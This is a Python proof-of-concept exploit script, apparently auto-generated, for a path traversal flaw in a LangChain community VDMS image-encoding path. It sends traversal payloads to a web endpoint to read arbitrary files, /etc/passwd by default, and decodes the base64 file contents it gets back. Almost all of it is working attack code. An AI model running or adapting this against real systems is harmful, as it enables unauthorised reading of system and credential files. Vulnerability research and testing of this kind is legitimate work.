#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-014
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_7.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in langchain-community-only.

Vulnerability: Path traversal in VDMS vectorstore's add_images -> encode_image chain.
The encode_image function opens any file path without validation, allowing arbitrary file reads.

Usage:
    python3 poc.py [--target http://localhost:8000] [--file /etc/passwd]

Default: reads /etc/passwd from localhost:8000
"""

import argparse
import base64
import sys
import requests
import json

# Default target - change if needed
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_FILE = "/etc/passwd"

def exploit(target_url, file_path):
    """
    Exploit the LFI by sending a path traversal payload to the vulnerable endpoint.
    
    The endpoint expects a JSON body with a 'uris' field containing a list of file paths.
    We send a path traversal payload like '../../etc/passwd' to read arbitrary files.
    """
    
    # Construct the path traversal payload
    # The number of '../' depends on the working directory of the server
    # We'll try a few common depths
    traversal_payloads = [
        f"../../../../../../..{file_path}",  # Deep traversal
        f"../../../..{file_path}",           # Medium traversal
        f"..{file_path}",                    # Shallow traversal
        file_path                            # Absolute path (if allowed)
    ]
    
    endpoint = f"{target_url}/api/v1/trigger"
    
    print(f"[*] Target: {endpoint}")
    print(f"[*] Attempting to read: {file_path}")
    print()
    
    for payload in traversal_payloads:
        try:
            # Prepare the request body
            # The vulnerable function expects 'uris' as a list of paths
            body = {
                "uris": [payload]
            }
            
            print(f"[*] Trying payload: {payload}")
            
            # Send the request
            response = requests.post(
                endpoint,
                json=body,
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"[*] Response status: {response.status_code}")
            
            if response.status_code == 200:
                # The response should contain the base64-encoded file content
                # Try to parse the response
                try:
                    result = response.json()
                    print(f"[+] Success! Response received.")
                    print(f"[+] Raw response: {json.dumps(result, indent=2)[:500]}")
                    
                    # The response might contain the base64-encoded file
                    # Look for base64 strings in the response
                    if isinstance(result, dict):
                        for key, value in result.items():
                            if isinstance(value, str) and len(value) > 50:
                                try:
                                    decoded = base64.b64decode(value).decode('utf-8', errors='replace')
                                    print(f"\n[+] Decoded content from key '{key}':")
                                    print(decoded[:2000])
                                    return True
                                except:
                                    pass
                    elif isinstance(result, list):
                        for item in result:
                            if isinstance(item, str) and len(item) > 50:
                                try:
                                    decoded = base64.b64decode(item).decode('utf-8', errors='replace')
                                    print(f"\n[+] Decoded content:")
                                    print(decoded[:2000])
                                    return True
                                except:
                                    pass
                    
                    # If we couldn't decode, print the raw response
                    print(f"\n[!] Could not automatically decode. Raw response:")
                    print(response.text[:2000])
                    return True
                    
                except json.JSONDecodeError:
                    print(f"[!] Response is not JSON. Raw text:")
                    print(response.text[:2000])
                    return True
            else:
                print(f"[-] Failed with status {response.status_code}")
                if response.text:
                    print(f"    Response: {response.text[:200]}")
                    
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error - is the server running at {target_url}?")
            return False
        except requests.exceptions.Timeout:
            print(f"[-] Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")
        
        print()
    
    print("[-] All payloads failed")
    return False

def main():
    parser = argparse.ArgumentParser(description="LFI PoC for langchain-community-only")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target URL (default: http://localhost:8000)")
    parser.add_argument("--file", default=DEFAULT_FILE, help="File to read (default: /etc/passwd)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only")
    print("=" * 60)
    print()
    
    success = exploit(args.target, args.file)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
